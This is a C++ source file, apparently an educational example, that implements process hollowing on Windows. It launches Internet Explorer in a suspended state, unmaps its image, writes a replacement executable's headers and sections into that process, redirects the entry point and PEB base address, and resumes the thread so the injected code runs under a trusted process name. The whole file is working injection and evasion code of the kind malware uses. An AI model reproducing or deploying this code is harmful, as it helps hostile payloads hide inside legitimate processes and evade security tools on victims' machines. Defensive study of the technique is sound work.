/*

Simple Process Hollowing Example

*/

#include <stdio.h>
#include <windows.h>
#include <fstream>
#include <winuser.h>
#include <iostream>
#include "myntdll.h"

LPVOID openFile(LPCWSTR const& replacement) {

	//Initialize variables
	DWORD read;

	// Get replacement executable's image
	HANDLE hFile = CreateFile(replacement, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL); // Opens replacement executable

	if (hFile == INVALID_HANDLE_VALUE) {
		CloseHandle(hFile); // Cleanup
		printf("\nCreateFile failed with error: %d\n", GetLastError());
		return 0;
	}

	SIZE_T rSize = GetFileSize(hFile, NULL);
	LPVOID rBaseAddr = VirtualAlloc(NULL, rSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); // Allocates memory in current exe for replacement executable

	ReadFile(hFile, rBaseAddr, rSize, &read, NULL); // Read payload executable's contents to the "read" pointer
	
	CloseHandle(hFile); // Cleanup
	printf("\nReplacement executable read to: 0x%08x\r\n", (UINT)rBaseAddr);
	return rBaseAddr; // Return the base address of the written memory
}

void pHollow(LPCWSTR const& target, LPCWSTR const& replacement) {

	// Initialize variables
	STARTUPINFO startInfo;
	PROCESS_INFORMATION processInfo;
	const int baseAddrLength = 4;
	const int baseAddrOffset = 8;

	// Zero Memory
	ZeroMemory(&processInfo, sizeof(processInfo));
	ZeroMemory(&startInfo, sizeof(startInfo));



	// Get replacement executable's contents
	LPVOID rBaseAddr = openFile(replacement);



	// Get replacement executable's DOS and NT headers
	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)rBaseAddr;
	PIMAGE_NT_HEADERS pNTHeader = (PIMAGE_NT_HEADERS)((DWORD)pDosHeader + (DWORD)pDosHeader->e_lfanew);

	if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
		printf("Replacemenmt executable does not have a valid DOS signature: %i", GetLastError());
	}



	// Create target process in a suspended state
	if (!CreateProcess(target, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &startInfo, &processInfo)) {
		printf("\nCreateProcess failed with error: %d\n", GetLastError());
		return;
	}


	// Get suspeded process's thread context
	PCONTEXT pCTX = new CONTEXT(); // Create a CONTEXT object
	pCTX->ContextFlags = CONTEXT_FULL;

	if (!GetThreadContext(processInfo.hThread, pCTX)) { // Get target process's thread context 
		printf("\nUnable to get thread context. GetThreadContext failed with error: %d\n", GetLastError());
		return;
	}

	printf("\nTarget process's thread context retrieved\r\n");
	printf("Target PEB address: EBX = 0x%08x\r\n", (UINT)pCTX->Ebx);
	printf("Target address of entry point: EAX = 0x%08x\r\n", (UINT)pCTX->Eax);



	// Get target process image's base address
	PVOID tBaseAddr;

	if (!ReadProcessMemory(processInfo.hProcess, (LPCVOID)(pCTX->Ebx + baseAddrOffset), &tBaseAddr, sizeof(LPVOID), NULL)) { // Gets the base address from the thread context
		printf("\nUnable to read target process's thread context. ReadProcessMemory failed with error: %d\n", GetLastError());
		return;
	}

	printf("Target image base address at address: 0x%08x\r\n", (UINT)tBaseAddr);



	// Unmap target memory at base address 
	if (NtUnmapViewOfSection(processInfo.hProcess, tBaseAddr)) {
		printf("\nUnable to unmap target process's executable section. NtUnmapViewOfSection failed with error: %d\n", GetLastError());
		return;
	}
	printf("\nHollowed target executable section at base address: 0x%08x\r\n", (UINT)tBaseAddr);



	// Allocate memory for replacement image
	LPVOID hollowedSection = VirtualAllocEx(processInfo.hProcess, tBaseAddr, pNTHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!hollowedSection) {
		printf("\nVirtualAllocEx failed with error %d\n", GetLastError());
		return;
	}
	printf("Allocated memory in target process for replacement image at: 0x%08x\r\n", (UINT)tBaseAddr);



	// Copy headers into allocation
	if (!WriteProcessMemory(processInfo.hProcess, tBaseAddr, pDosHeader, pNTHeader->OptionalHeader.SizeOfHeaders, NULL)) {
		printf("\nUnable to write to target process's allocated memory. WriteProcessMemory failed with error: %d\n", GetLastError());
		return;
	}



	// Copy the other sections
	for (int i = 0; i < pNTHeader->FileHeader.NumberOfSections; i++) // Writes the rest of the payload executable's sections into the suspended process
	{
		PIMAGE_SECTION_HEADER pSectionData = (PIMAGE_SECTION_HEADER)((LPBYTE)rBaseAddr + pDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));
		WriteProcessMemory(processInfo.hProcess, (PVOID)((LPBYTE)hollowedSection + pSectionData->VirtualAddress), (PVOID)((LPBYTE)rBaseAddr + pSectionData->PointerToRawData), pSectionData->SizeOfRawData, NULL);
	}


	// Overwrite thread context and PEB
	pCTX->Eax = (DWORD)hollowedSection + (DWORD)pNTHeader->OptionalHeader.AddressOfEntryPoint; // Sets the thread context's EAX register to the entry point adress
	printf("\nSuccessfully set the new entry point at: 0x%08x\n", (UINT)pCTX->Eax);

	WriteProcessMemory(processInfo.hProcess, (PVOID)(pCTX->Ebx + baseAddrOffset), &tBaseAddr, baseAddrLength, NULL); // Overwrites PEB base address with that of the replacement image
	
	SetThreadContext(processInfo.hThread, pCTX); // Set new thread context to the suspended thread
	
	ResumeThread(processInfo.hThread); // Resume (unsuspend) the target process thread (now running malicious code)

	printf("\nThread Resumed");

	// Cleanup

	WaitForSingleObject(processInfo.hProcess, INFINITE); // Waits for created process to exit
	CloseHandle(processInfo.hProcess); // Closes process handle 
	CloseHandle(processInfo.hThread); // Closes thread handle

	// VirtualAllocEx cleanup
	VirtualFree(rBaseAddr, 0, MEM_RELEASE);
	//VirtualFree(GetCurrentProcess, NULL, MEM_RELEASE);
}

void main() {
	pHollow(L"C:\\Program Files (x86)\\Internet Explorer\\iexplore.exe", L"C:\\Path\\To\\Test.exe");
}
